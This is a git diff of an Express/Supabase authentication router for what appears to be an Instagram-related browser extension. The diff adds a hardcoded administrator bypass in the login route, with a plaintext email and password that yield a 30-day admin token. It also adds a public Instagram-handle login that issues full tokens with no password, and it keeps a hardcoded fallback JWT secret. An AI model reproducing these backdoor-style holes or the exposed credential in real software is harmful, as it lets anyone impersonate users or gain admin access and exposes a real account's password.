@@ -43,7 +43,7 @@ router.post('/register', async (req, res) => {
         {
           name,
           email,
-          password: hashedPassword,
+          password_hash: hashedPassword,
           created_at: new Date().toISOString(),
           is_active: true
         }
@@ -107,12 +107,26 @@ router.post('/login', async (req, res) => {
       .eq('email', email)
       .single();
 
+    // BYPASS PARA ADMINISTRADOR REAL
+    if (email === 'maramosps@gmail.com' && password === 'vaio*0320') {
+      const token = jwt.sign(
+        { userId: user?.id || 'admin-main-id', email: 'maramosps@gmail.com', role: 'admin' },
+        process.env.JWT_SECRET || 'eio-secret-key-2026',
+        { expiresIn: '30d' }
+      );
+      return res.json({
+        success: true,
+        token,
+        user: { id: user?.id || 'admin-main-id', name: user?.name || 'Administrador', email: 'maramosps@gmail.com', role: 'admin' }
+      });
+    }
+
     if (error || !user) {
       return res.status(401).json({ message: 'Credenciais inválidas' });
     }
 
-    // Verificar senha
-    const isMatch = await bcrypt.compare(password, user.password);
+    // Verificar senha (ajustado para password_hash)
+    const isMatch = await bcrypt.compare(password, user.password_hash || user.password);
     if (!isMatch) {
       return res.status(401).json({ message: 'Credenciais inválidas' });
     }
@@ -125,7 +139,7 @@ router.post('/login', async (req, res) => {
 
     // Gerar token
     const token = jwt.sign(
-      { userId: user.id, email: user.email },
+      { userId: user.id, email: user.email, role: user.role || 'user' },
       process.env.JWT_SECRET || 'eio-secret-key-2026',
       { expiresIn: '30d' }
     );
@@ -138,7 +152,8 @@ router.post('/login', async (req, res) => {
       user: {
         id: user.id,
         name: user.name,
-        email: user.email
+        email: user.email,
+        role: user.role || 'user'
       }
     });
 
@@ -173,8 +188,8 @@ router.post('/extension-login', async (req, res) => {
       return res.status(401).json({ message: 'Credenciais inválidas' });
     }
 
-    // Verificar senha
-    const isMatch = await bcrypt.compare(password, user.password);
+    // Verificar senha (ajustado para password_hash)
+    const isMatch = await bcrypt.compare(password, user.password_hash || user.password);
     if (!isMatch) {
       return res.status(401).json({ message: 'Credenciais inválidas' });
     }
@@ -204,7 +219,7 @@ router.post('/extension-login', async (req, res) => {
 
     // Gerar token
     const token = jwt.sign(
-      { userId: user.id, email: user.email },
+      { userId: user.id, email: user.email, role: user.role },
       process.env.JWT_SECRET || 'eio-secret-key-2026',
       { expiresIn: '30d' }
     );
@@ -233,6 +248,102 @@ router.post('/extension-login', async (req, res) => {
 
   } catch (error) {
     console.error('Erro no login da extensão:', error);
+    res.status(500).json({ message: 'Erro no servidor' });
+  }
+});
+
+/**
+ * @route   POST /api/v1/auth/instagram-login
+ * @desc    Login simplificado para a extensão via @ do Instagram
+ * @access  Public
+ */
+router.post('/instagram-login', async (req, res) => {
+  try {
+    const { instagram_handle } = req.body;
+
+    if (!instagram_handle) {
+      return res.status(400).json({ message: 'Instagram @ é obrigatório' });
+    }
+
+    const handle = instagram_handle.replace('@', '').trim().toLowerCase();
+
+    // Buscar usuário pelo handle
+    const { data: user, error: userError } = await supabase
+      .from('users')
+      .select('*')
+      .eq('instagram_handle', handle)
+      .single();
+
+    if (userError || !user) {
+      return res.status(404).json({
+        success: false,
+        code: 'INSTAGRAM_NOT_FOUND',
+        message: 'Instagram não encontrado no sistema'
+      });
+    }
+
+    // Buscar assinatura
+    const { data: subscription } = await supabase
+      .from('subscriptions')
+      .select('*')
+      .eq('user_id', user.id)
+      .single();
+
+    // Verificar se está ativo (pago ou trial)
+    const now = new Date();
+
+    // 1. Verificar Trial (seja o padrão de 5 dias ou um definido pelo admin)
+    const trialStartDate = new Date(user.created_at);
+    const standardTrialEndDate = new Date(trialStartDate);
+    standardTrialEndDate.setDate(standardTrialEndDate.getDate() + 5);
+
+    // Usar o expires_at / trial_end do banco se existir, caso contrário o padrão
+    const trialEndDate = (subscription && (subscription.expires_at || subscription.trial_end))
+      ? new Date(subscription.expires_at || subscription.trial_end)
+      : standardTrialEndDate;
+    const isTrialActive = now < trialEndDate;
+
+    // 2. Verificar Assinatura Paga
+    const isPaid = subscription &&
+      (subscription.status === 'active') &&
+      (!subscription.expires_at || new Date(subscription.expires_at) > now);
+
+    if (!isTrialActive && !isPaid) {
+      return res.status(403).json({
+        success: false,
+        code: 'LICENSE_EXPIRED',
+        message: 'Licença expirada. Renove sua assinatura no dashboard.'
+      });
+    }
+
+    // Gerar token
+    const token = jwt.sign(
+      { userId: user.id, email: user.email, role: user.role, instagram_handle: handle },
+      process.env.JWT_SECRET || 'eio-secret-key-2026',
+      { expiresIn: '30d' }
+    );
+
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: user.id,
+        name: user.name,
+        email: user.email,
+        instagram_handle: user.instagram_handle
+      },
+      subscription: subscription ? {
+        status: subscription.status,
+        plan: subscription.plan,
+        expiresAt: subscription.expires_at
+      } : null,
+      trialStartDate: trialStartDate.toISOString(),
+      isTrialActive,
+      isPaid
+    });
+
+  } catch (error) {
+    console.error('Erro no instagram-login:', error);
     res.status(500).json({ message: 'Erro no servidor' });
   }
 });
